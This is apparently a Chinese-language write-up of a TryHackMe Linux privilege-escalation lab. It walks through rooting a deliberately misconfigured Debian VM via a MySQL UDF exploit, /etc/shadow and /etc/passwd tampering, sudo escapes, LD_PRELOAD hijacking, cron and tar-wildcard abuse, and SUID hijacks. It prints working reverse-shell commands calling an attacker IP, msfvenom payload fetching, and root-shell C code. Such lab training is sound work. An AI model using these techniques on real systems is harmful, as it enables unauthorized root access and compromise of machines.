---
description: >-
  本文相关内容：在一个配置错误的Debian虚拟机上练习Linux提权，使用多种方法获得root，目标机支持使用SSH协议访问，ssh凭证 --
  user:password321 。
---

# Linux Privesc(Linux提权)-练习

TryHackMe实验房间链接：https://tryhackme.com/room/linuxprivesc&#x20;



## 准备阶段

部署靶机，靶机在22端口开启了SSH，可以使用ssh user@MACHINE\_IP登录目标机的user用户，密码为password321 。

如果你得到一个错误：`Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: ssh-rsa, ssh-dss`

这可能是因为 OpenSSH 已经不支持 ssh-rsa，请在你的命令中添加`-oHostKeyAlgorithms=+ssh-rsa`重新进行连接。

完成以上操作之后，接下来的任务会教你不同的权限提升技巧，你需要完成任务得到root shell。

请记住在开始下一个任务之前退出 shell 并将会话重新建立为“user”帐户！

**答题**

要求一：部署靶机并使用 SSH 登录到目标机器的“user”帐户。（靶机类型为Linux Debian系）

使用以下命令：

```shell
ssh user@10.10.230.41 -oHostKeyAlgorithms=+ssh-rsa
```

![image-20221009203343760](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009203343760.png)

要求二：运行" id "命令，能得到什么结果？

![image-20221009204035083](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009204035083.png)

> uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

答题卡

![image-20221009204125895](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009204125895.png)

## 服务漏洞exp提权

服务只是在后台运行、接受输入或执行常规任务的程序。如果弱势服务以root权限运行，则可以利用它们实现命令执行。

如果MySQL 服务能够以 root 用户身份运行（错误配置的 MySQLServer ），那么我们可以使用一个很流行的漏洞exp--来利用用户定义函数(UDF--User Defined Functions )，然后通过运行 MySQL 服务来获得root 用户权限以执行系统命令。

> MySQL（Linux）-UDF-exp地址链接：https://www.exploit-db.com/exploits/1518
>
> 相关漏洞详情：https://www.cvedetails.com/cve/CVE-2005-0711
>
> 该exp影响的目标范围：MySQL 4.x/5.0 (Linux) + 错误配置的 MySQLServer

查看以root权限运行的服务，查看mysql版本：

```shell
ps aux | grep "^root"
mysqld --version
```

![image-20221011201522978](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011201522978.png)

![image-20221011201822755](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011201822755.png)

**使用以上exp进行提权**

```shell
#切换目录：
cd /home/user/tools/mysql-udf  #在该路径下有一个aptor_udf2.c文件 （这个是靶机创建者提供的exp文件，和上面链接中的exp内容一致）
```

raptor\_udf2.c文件的内容如下（和链接中给出的exp内容一致）：

![image-20221009210716793](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009210716793.png)

该exp文件内容中的注释部分给出了用法示例，我们先查看一下：

![image-20221009211507146](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009211507146.png)

对exp文件进行编译（以下命令能够在上图中找到）：

```shell
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
#使用 gcc 需要两次运行才能编译成一个共享对象。
#你可以在目标机或者攻击机上编译 C 代码，如果你在攻击机上编译它，请记住操作系统的体系结构可能不同，所以最好还是在目标机上进行编译
```

使用空白密码作为 root 用户连接到 MySQL 服务，得到一个MySQL shell:

```shell
mysql -u root
#如果此处需要密码的话，我们要先找到mysql用户的密码，然后使用mysql -u root -p 登录mysql
#关于mysql的用户和密码信息，尝试找一下/var/www/html/config.inc.php 
```

![image-20221009212632169](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009212632169.png)

在 MySQL shell 上执行以下命令，利用我们已经编译过的exp创建用户定义函数(UDF) " do \_ system ":

```shell
#选择 mysql db
use mysql;

#我们需要创建一个临时表供我们使用。因为我们需要一个地方来加载共享的二进制文件到 MySQL。
create table foo(line blob);

#接下来需要将文件内容插入到表中
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

#要使用UDF，我们还需要找到插件目录的位置，这就是我们需要存储文件的地方，可以通过命令找到：show variables like '%plugin%';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

#创建函数
create function do_system returns integer soname 'raptor_udf2.so';

#验证函数是否成功被创建：select * from mysql.func;
```

![image-20221009212855992](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009212855992.png)

使用刚才创建的函数将/bin/bash 复制到/tmp/rootbash 并设置 SUID 权限:

```shell
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
#也可以执行其他命令如:"select do_system('nc 192.168.1.24 4444 -e /bin/bash &');"  提前在攻击机上设置netcat监听器，就能捕获一个root shell。
```

![image-20221009213148629](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009213148629.png)

退出 MySQL shell（输入 **exit** 或者 **\q** 然后按下回车键），并用-p 运行/tmp/rootbash 可执行文件，以获得一个具有 root 特权的 shell:

```shell
/tmp/rootbash -p
```

![image-20221009213702587](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009213702587.png)

操作成功之后，删除/tmp/rootbash 可执行文件并退出root shell，继续做下一个任务。

```shell
rm /tmp/rootbash
exit
```

## 弱文件权限提权-可读的/etc/shadow

/etc/shadow 文件包含用户的密码哈希值，通常只有 root 用户可读，如果普通用户也能对etc/shadow 文件进行读取，那么我们就能利用可读的/etc/shadow提权。

查看/etc/shadow 文件权限分配情况（发现其他用户也有读写权限）：

```shell
 ls -l /etc/shadow
```

![image-20221009220835953](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009220835953.png)

查看/etc/shadow 文件的内容:

```shell
cat /etc/shadow
```

/etc/shadow文件内容中的每一行代表一个用户，可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码hash值(如果有的话)。

![image-20221009221411074](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009221411074.png)

将 root 用户的 hash 保存到 Kali VM 上名为 hash.txt 的文件中，并使用 john the ripper 来破解它。你可能必须首先解压缩/usr/share/wordlist/rockyou. txt.gz 并根据你的 Kali 版本使用 sudo 运行命令:

![image-20221009221541737](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009221541737.png)

![image-20221009221710759](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009221710759.png)

![image-20221009223848063](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009223848063.png)

> root的密码hash为：$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
>
> 破解得到的root密码为：password123
>
> 使用的hash算法为（使用john进行hash破解时，会自动显示hash算法类型）：sha512crypt

切换用户到root，使用刚才获取的root用户的密码进行登录，得到root权限：

```shell
su root #密码为：password123
```

![image-20221009222116089](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009222116089.png)

答题卡

![image-20221009222351998](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009222351998.png)

## 弱文件权限提权-可写/etc/shadow

/etc/shadow 文件包含用户的密码哈希值，通常只有 root 用户可写，如果普通用户也能对etc/shadow 文件进行写入，那么我们就能利用可写的/etc/shadow提权。

在上一节中，使用" ls -l /etc/shadow "查看/etc/shadow文件的权限分配情况时，发现其他用户能够对/etc/shadow文件进行读写。

现在，使用一个自己选择的密码来生成一个新的密码hash值:

```shell
mkpasswd -m sha-512 newpassword  #从上一小节中，我们已经知道root用户的密码hash值 使用的算法类型
```

编辑/etc/shadow 文件，并用刚刚生成的密码散列(hash)值 替换原始 root 用户的密码散列值，然后切换到root用户，使用自己设置的密码进行登录，得到root权限：

```shell
nano /etc/shadow
su root #新密码为：newpassword
```

![image-20221009224648889](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009224648889.png)

![image-20221009225005386](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009225005386.png)

## 弱文件权限提权-可写/etc/passwd

/etc/passwd 文件包含有关用户帐户的信息，通常只能由 root 用户写入。从历史上看，以前的/etc/passwd 文件会包含用户的密码哈希值，而且现在某些版本的 Linux 仍然允许在/etc/passwd文件中存储用户的密码哈希值

**Linux系统为了向后兼容，有如下特性：如果/etc/passwd中用户行的第二个字段包含密码哈希，它将优先于/etc/shadow中的哈希。**

使用" ls -l /etc/passwd " 查看/etc/passwd文件的权限分配情况（发现其他用户可读写/etc/passwd文件）：

![image-20221009225441685](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009225441685.png)

使用一个自定义的密码重新生成一个新的密码hash值：

```ssh
openssl passwd 123456
```

编辑/etc/passwd 文件，并将刚才新生成的密码hash放置在 root 用户行的第一个和第二个冒号(:)之间(替换“ x”)，然后切换到 root 用户，使用新密码登录:

```shell
nano /etc/passwd
su root
#或者添加一个新的root用户条目（此处使用的hash值也是刚才生成的）：newroot:$1$.35ewmwH$HoI6txtQIjK0XEl7weECl.:0:0:root:/root:/bin/bash
#然后使用新增的root用户身份进行登录
```

![image-20221009231029644](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009231029644.png)

![image-20221009231138876](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009231138876.png)

![image-20221009231316519](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009231316519.png)

**答题卡**

![image-20221009231422837](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009231422837.png)

## Sudo提权-Shell 转义序列

输入命令" sudo -l " ，查看普通用户user能够以root权限运行何种服务且不需要密码：

![image-20221009204625075](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009204625075.png)

访问GTFOBins（https://gtfobins.github.io/）并搜索上图中的程序名称，如果某些程序以“ sudo”被列出，你就可以尝试使用它来提升权限，这个过程通常是通过转义序列来完成。

上图列出的命令或者程序在 GTFOBins 上没有 shell 转义序列的是：

![image-20221010001117660](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010001117660.png)

从命令" sudo -l "的输出列表中选择一个程序，然后使用 GTFOBins 中的命令尝试获得一个 root shell，具体的指令已经记录在下面：

```shell
#iftop的sudo提权命令
sudo iftop
!/bin/sh

#nano的sudo提权命令
sudo nano
^R^X
reset; sh 1>&0 2>&0

#vim的sudo提权命令
sudo vim -c ':!/bin/sh'  #还有其他可行命令，但是需要语言环境支持，具体请参考GTFOBins

#man的sudo提权命令
sudo man man
!/bin/sh

#awk的sudo提权命令
sudo awk 'BEGIN {system("/bin/sh")}'

#less的sudo提权命令
sudo less /etc/profile
!/bin/sh

#nmap的sudo提权命令（禁用输入回显）
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

#nmap的sudo提权命令（利用nmap版本2.02至5.21的交互模式）
sudo nmap --interactive
nmap> !sh

#more的sudo提权命令
TERM= sudo more /etc/profile
!/bin/sh
```

选择vim程序来进行提权操作（退出vim使用" :quit "）：

```shell
#方法一：输入sudo vim，然后在vim编辑器界面按下Shift键加" : "键，接着输入"!sh"，按下回车即可
sudo vim 
:!sh      #用:!bash也可以
whoami

#方法二：输入以下命令，执行即可
sudo vim -c ':!/bin/bash'  #也可以用sudo vim -c ':!/bin/sh'

#两种方法原理是一样的，都是尝试让vim程序执行 启动shell的命令（可以启动bash、sh等）
```

![image-20221010001540832](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010001540832.png)

![image-20221010002040683](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010002040683.png)

![image-20221010002906921](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010002906921.png)

尝试在没有 shell 转义序列的情况下，使用sudo来操作apache2程序进行提权：

```
 sudo apache2 -f /etc/shadow
```

![image-20221010004008049](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010004008049.png)

拿到root用户的密码hash值，然后使用john进行hash破解，最后使用密码直接登陆root用户即可（前面已经有类似的操作截图，此处不再赘述）

**答题卡**

![image-20221010001301811](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010001301811.png)

## Sudo提权-环境变量

可以将 Sudo 配置为从用户的环境继承某些环境变量。

检查继承了哪些环境变量(在本例中查看 env \_ keep 选项) :

```
sudo -l
```

![image-20221010105045536](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010105045536.png)

从上图可以看到 LD\_PRELOAD 和 LD\_LIBRARY\_PATH 都是从用户环境继承的，当程序运行时，LD\_PRELOAD 会先加载一个共享对象，而LD\_LIBRARY\_PATH 则提供了首先搜索共享库的目录列表。我们可以对环境变量LD\_PRELOAD 和LD\_LIBRARY\_PATH进行利用（使用sudo）。

> 关于LD\_PRELOAD利用的资料：
>
> https://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/
>
> https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld\_preload-to-cheat-inject-features-and-investigate-programs/

使用位于/home/user/tools/sudo/preload.c 的代码创建一个共享对象:

```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
#本质上是编译preload.c 以便我们使用它
```

为了解实现原理，我们看一下preload.c的内容：

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
//执行_init函数：释放环境变量、设置uid和root的uid对应、设置命令"/bin/bash -p"（该命令作用是打开bash shell）

//    unsetenv函数介绍
//    头文件：#include<stdlib.h>
//    函数原型： int unsetenv(const char* name)
//    函数说明：删除name环境变量的定义，即使不存在也不会出错
//    参数：name为环境变量名称字符串。 
//    返回值：成功返回0，错误返回-1
```

运行一个允许通过 sudo 运行的程序(在运行 sudo-l 时会列出) ，同时将 LD \_ PRELOAD 环境变量设置为新共享对象的完整路径（此时能获取到root shell）:

```shell
sudo LD_PRELOAD=/tmp/preload.so vim
#使用LD_PRELOAD环境变量能够在程序中覆盖任意的函数调用
#当sudo vim执行时，本应该调用vim，但是此处会先加载共享对象/tmp/preload.so
```

![image-20221010111513934](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010111513934.png)

退出root shell，继续操作：对 apache2程序文件运行 ldd，该命令能够查看程序使用哪些共享库:

```
ldd /usr/sbin/apache2
```

![image-20221010111823923](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010111823923.png)

使用位于/home/user/tools/sudo/library \_ path.c的代码创建一个与apache2列出的库(libcrypt.so.1)同名的共享对象:

```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
#本质上是编译library_path.c 以便我们使用它
```

为了解实现原理，我们看一下library\_path.c的内容：

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
//执行hijack函数：释放环境变量、设置uid和root的uid对应、设置命令"/bin/bash -p"（该命令作用是打开bash shell）

//    unsetenv函数介绍
//    头文件：#include<stdlib.h>
//    函数原型： int unsetenv(const char* name)
//    函数说明：删除name环境变量的定义，即使不存在也不会出错
//    参数：name为环境变量名称字符串。 
//    返回值：成功返回0，错误返回-1
```

使用 sudo 运行 apache2，同时将LD\_LIBRARY\_PATH 环境变量设置为/tmp (/tmp目录下存在已编译的共享对象)，获得root shell :

```shell
sudo LD_LIBRARY_PATH=/tmp apache2
#此处运行sudo apache2时，本应该会加载apache2所使用的共享库
#但刚才创建了一个和apache2使用的真实共享库同名的共享对象（/tmp/libcrypt.so.1），并且指定了首先搜索共享库的目录列表（/tmp）
#所以以上命令执行时，会先加载/tmp/libcrypt.so.1共享对象
```

![image-20221010111937431](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010111937431.png)

退出root shell，将上面的/tmp/libcrypt.so.1文件 重命名为apache2使用的另一个库的名称，然后再次使用 sudo 重新运行 apache2（也能获得root权限）：

![image-20221010112612951](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010112612951.png)

## Cron Jobs提权-文件权限分配错误

Cron 作业（jobs）是用户可以安排在特定时间或间隔运行的程序或脚本。Cron 表文件(crontabs)里面存储着 Cron 作业的配置，在系统范围内的 crontab 位于/etc/crontab路径下。

使用命令查看全系统 crontab 的内容:

```shell
cat /etc/crontab
```

![image-20221010121227914](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010121227914.png)

可以看到：有两个 cron 作业计划每分钟运行一次，一个运行 overwrite.sh，另一个运行/usr/local/bin/compress.sh。

我们找到 overwrite.sh 文件的完整路径，查看权限分配情况（普通用户可读写）:

```shell
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
```

![image-20221010121410531](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010121410531.png)

用以下内容替换overwrite.sh文件内容（ip修改为攻击机ip，在使用openvpn的情况下，是tun0处的ip地址，输入ifconfig查看即可）：

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.14.30.69/4444 0>&1
```

![image-20221010121641537](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010121641537.png)

新的overwrite.sh文件内容其实是一个反向shell payload，我们在攻击机的端口4444上设置一个 netcat 监听器，并等待目标机上的cron 作业运行(应该不会超过一分钟)，然后root shell就会回连攻击机上的 netcat 监听器：

```shell
nc -nvlp 4444
```

![image-20221010121840221](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010121840221.png)

## Cron Jobs提权-PATH环境变量

使用命令查看全系统 crontab 的内容（cat /etc/crontab），和上一小节一样的结果，可以看到有两个 cron 作业计划每分钟运行一次，一个运行 overwrite.sh，另一个运行/usr/local/bin/compress.sh，还可以看到crontab的PATH变量值。

![image-20221010220213700](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010220213700.png)

在本小节我们要利用Cron Jobs结合PATH环境变量来提权，注意，由上图可知：本例中crontab的PATH 变量是从/home/user 开始（这是用户的 home 目录）

在/home/user/目录下，创建一个名为 overwrite.sh的文件，其内容如下：

```shell
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

最后再确保刚刚创建的overwrite.sh文件有可执行权限：

```shell
chmod +x /home/user/overwrite.sh
```

![image-20221010220715408](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010220715408.png)

等待 cron 作业运行(不应超过一分钟)，然后使用-p 运行/tmp/rootbash 命令，以获得具有 root 权限的 shell:

```shell
/tmp/rootbash -p
```

此处的原理：

由于本例中crontab的PATH 变量是从/home/user路径开始（运行cron jobs时，第一个找的就是该路径），所以我们在/home/user目录下 伪造一个overwrite.sh文件，它和系统中的cron作业------overwrite.sh名字相同；

系统在运行cron jobs时，会根据PATH变量先找到伪造的overwrite.sh文件并去执行它，然后伪造的overwrite.sh会生成一个带s权限的文件rootbash，而rootbash实际上是bash文件的一个副本：运行效果是以root身份执行bash文件，会打开一个root shell（shell的类型为bash，权限为root）。

![image-20221010220922293](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010220922293.png)

验证完之后，删除文件并退出root shell：

```shell
rm /tmp/rootbash
exit
```

**答题卡**

![image-20221010221107786](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010221107786.png)

## Cron Jobs提权-tar命令结合通配符

衔接上一小节，我们查看另外一个cron job文件的内容：

```
cat /usr/local/bin/compress.sh
```

![image-20221010221532196](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010221532196.png)

从上图我们能看到：tar 命令是在 home 目录中使用通配符(\*)运行的，将/home/user下所有文件和目录打包并压缩成/tmp/backup.tar.gz 。

tar常见命令参数：

```shell
#语法：tar [-zjxcvfP] filename 
c   //创建新的归档文件
x   //对归档文件解包
t   //列出归档文件里的文件列表
v   //输出命令的归档或解包的过程
f   //指定包文件名，多参数f写最后
C   //指定解压目录位置
z   //使用gzip压缩归档后的文件(.tar.gz)
j   //使用bzip2压缩归档后的文件(.tar.bz2)
J   //使用xz压缩归档后的文件(tar.xz)
X   //排除多个文件(写入需要排除的文件名称)
h   //打包软链接
P   //连带绝对路径打包
--hard-dereference  //打包硬链接
--exclude   //在打包的时候写入需要排除的文件或目录

//常用打包与压缩组合
czf     //打包成tar.gz格式
cjf     //打包成tar.bz格式
cJf     //打包成tar.xz格式

zxf     //解压tar.gz格式
jxf     //解压tar.bz格式
xf      //自动选择解压模式
tf      //查看压缩包内容

//以gzip归档方式打包并压缩
tar czf  test.tar.gz  test/ test2/

//以bz2方式打包并压缩 
tar cjf  test.tar.bz2 dir.txt dir/
```

查看 GTFOBins 页面中的 tar（https://gtfobins.github.io/gtfobins/tar/），tar命令也可用于sudo提权。

注意：tar 具有命令行选项且具有检查点特性（checkpoint），我们可以利用tar的特性从而让tar命令将文件名识别为命令行。

在攻击机上使用 msfvenom生成一个反向 shell ELF 二进制文件，修改 LHOST IP 地址:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.14.30.69 LPORT=4444 -f elf -o shell.elf
```

将 shell.elf 文件传输到目标机的/home/user/目录下(你可以使用 scp 或者在 Kali机上的 webserver 上托管shell.elf文件，并在目标机上使用 wget获取)。

```shell
#攻击机
python3 -m http.server 8000
#目标机（攻击机上的ssh界面）
cd /home/user/
wget 10.14.30.69:8000/shell.elf
```

确保文件是可执行的:

```shell
chmod +x /home/user/shell.elf
```

在/home/user 中创建这两个文件:

```shell
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
#--checkpoint=n：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由--checkpoint-action指定
#exec：执行外部命令或运行可执行文件
```

当 cron 作业中的 tar 命令运行时，通配符(\*)将扩展为包含上面两个文件（因为它们都在/home/user中），由于它们的文件名是有效的 tar 命令行选项，tar 将识别它们，并将它们视为命令行选项而不是文件名。

在攻击机的端口4444上设置一个 netcat 监听器，并等待目标机上的cron 作业运行(应该不会超过一分钟)，然后root shell就会回连攻击机上的 netcat 监听器：

```shell
nc -nlvp 4444
```

![image-20221010233628546](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010233628546.png)

操作完之后退出root shell，并删除刚才的文件：

```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

## SUID/SGID 可执行文件提权-已知漏洞exp

在目标机上查找所有的 SUID/SGID 可执行（二进制）文件:

```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
#运行SUID/SGID可执行文件时，会暂时获得文件拥有者的用户权限或者文件所在组的用户权限
#如果某一个SUID文件的拥有者是root，那么执行该文件时的权限就是root权限了。
#我们要达到的目的是以root权限执行shell命令：如/bin/bash等；这样就能得到一个root shell的命令行环境。
```

![image-20221011001541163](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011001541163.png)

注意，结果中出现了/usr/sbin/exim-4.84-3，尝试找到这个版本的exim的已知漏洞：搜索 Exploit-DB, Google, 以及GitHub等等 。

> Exploit-DB：https://www.exploit-db.com/
>
> vulners：https://vulners.com/
>
> GTFOBins：https://gtfobins.github.io/

通过检索，我们知道有一个与这个 exim 版本完全匹配的本地权限提升漏洞exp，在实际环境中，我们要自己下载好exp并上传或者复制到目标机上。

在目标机上运行exp程序，获取 root shell：

```
/home/user/tools/suid/exim/cve-2016-1531.sh
```

![image-20221011002007533](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011002007533.png)

## SUID/SGID 可执行文件提权-共享对象注入

目标机上的SUID 可执行文件：/usr/local/bin/suid-so ，容易受到共享对象注入的影响。

在文件上运行 strace命令，跟随suid-so文件的执行情况，并在输出中搜索" open "、" access "调用和" no such file "错误:

```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

![image-20221011004602835](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011004602835.png)

> 关于strace命令的文档学习：https://jvns.ca/strace-zine-v3.pdf

注意，我们通过观察发现：可执行文件suid-so试图在我们的主目录里加载\*\*/home/user/.config/libcalc.so\*\*共享对象，但是找不到。

现在我们开始伪造一个/home/user/.config/libcalc.so共享对象文件。

我们先创建.config 目录：

```shell
mkdir /home/user/.config
```

再创建一个libcalc.c（这个文件能产生一个 Bash shell），libcalc.c文件的内容如下：

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

c文件在linux中要编译才能使用，我们将libcalc.c编译成一个共享对象并放置在/home/user/.config路径下：

```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

再次执行suid-so可执行文件，这次suid-so会成功加载一个伪造的/home/user/.config/libcalc.so共享对象，最终效果是得到一个 root shell。

```shell
/usr/local/bin/suid-so
```

![image-20221011005041293](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011005041293.png)

## SUID/SGID 可执行文件提权-环境变量

PATH环境变量介绍：

```txt
使用cat $PATH或者echo $PATH ，可以查看当前用户的PATH环境变量，使用env可以查看系统的所有环境变量（env|more 分页查看）

PATH 环境变量的内容是由一堆目录组成的，各目录之间用冒号“:”隔开。
当执行某个命令时，Linux 会依照 PATH 中包含的目录依次搜寻该命令的可执行文件，一旦找到，即正常执行；反之，则提示无法找到该命令。
注意：如果在 PATH 包含的目录中，有多个目录都包含某命令的可执行文件，那么会执行先搜索到的可执行文件。（这一特性可以利用）
```

![image-20221011013636164](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011013636164.png)

我们可以利用目标机上的SUID 可执行文件/usr/local/bin/suid-env，因为它继承了用户的 PATH 环境变量（/usr/local/bin/包含在PATH变量值中），并且尝试在不指定绝对路径的情况下执行程序。

首先，执行/usr/local/bin/suid-env文件并注意它似乎试图启动 apache2 webserver:

```shell
/usr/local/bin/suid-env
```

![image-20221011005751394](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011005751394.png)

在该文件上运行strings命令，查找文件内容中的可打印字符并打印出字符串:

```shell
strings /usr/local/bin/suid-env
```

![image-20221011005731567](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011005731567.png)

观察strings命令打印出来的内容，最后一行(“ service apache2 start”)表示调用了service可执行文件来启动 web 服务器，但是此处没有使用service可执行文件的完整路径(/usr/sbin/service)。

我们可以伪造一个同名service可执行文件，并且将这个伪造文件对应的目录添加到PATH环境变量值中，因为后添加的目录会在PATH变量值的第一个位置，所以伪造的文件能够被首先执行到。（这是因为真正的service 文件在执行时，没有指定完整路径）

我们先创建一个service.c，再把它编译成可执行文件service ，我们来看一下的service.c的内容：

```c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
//很明显，service.c的代码效果会产生一个bash shell
```

现在将/home/user/tools/suid/service.c 编译成名为 service 的可执行文件（编译完成后，service 文件会出现在当前的工作目录）:

```shell
gcc -o service /home/user/tools/suid/service.c
#编译得到的service在/home/usr目录下 
```

